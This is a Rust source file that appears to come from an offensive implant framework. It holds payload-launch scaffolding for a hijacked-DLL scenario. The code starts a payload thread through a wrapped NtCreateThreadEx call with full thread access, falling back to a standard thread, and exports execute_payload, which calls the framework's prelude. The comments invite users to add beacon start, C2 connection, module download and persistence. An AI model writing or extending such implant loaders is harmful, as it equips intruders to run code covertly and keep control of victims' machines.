use std::{thread, ptr};

/// Thread creation interface with feature-based overrides
#[cfg(feature = "native_thread")]
pub fn create_payload_thread() {
    use malefic_helper::win::kit::apis::{m_nt_create_thread_ex, m_get_current_process};

    unsafe {
        let mut thread_handle: *mut core::ffi::c_void = ptr::null_mut();
        let thread_handle_ptr: *mut core::ffi::c_void = &mut thread_handle as *mut _ as *mut core::ffi::c_void;
        let current_process = m_get_current_process();
        let start_routine = execute_payload as *const () as *mut core::ffi::c_void;

        let ret = m_nt_create_thread_ex(
            thread_handle_ptr,      // ThreadHandle
            0x1FFFFF,               // DesiredAccess (THREAD_ALL_ACCESS)
            ptr::null_mut(),        // ObjectAttributes
            current_process,        // ProcessHandle
            start_routine,          // StartAddress
            ptr::null_mut(),        // StartParameter
            0,                      // CreateSuspended (FALSE)
            0,                      // StackZeroBits
            0,                      // SizeOfStackCommit
            0,                      // SizeOfStackReserve
            ptr::null_mut(),        // AttributeList
        );

        // NT_SUCCESS(ret) means ret == 0
        if ret != 0 {
            // Fallback to std::thread if NtCreateThreadEx fails
            thread::spawn(|| { execute_payload(); });
        }
    }
}

#[cfg(not(feature = "native_thread"))]
pub fn create_payload_thread() {
    thread::spawn(|| { execute_payload(); });
}

/// User-implemented payload function
/// This is the ONLY code users need to care about
/// This function will be executed in a new thread when hijacked function is called
///
/// Users can implement here:
/// - Start beacon
/// - Download additional modules
/// - Establish C2 connection
/// - Persistence mechanisms
/// And other payload functionality
#[no_mangle]
pub extern "C" fn execute_payload() {
    // TODO: Users add their payload implementation here
    #[cfg(feature = "malefic-prelude")]
    if let Err(_e) = malefic_prelude::run() {
    }
}
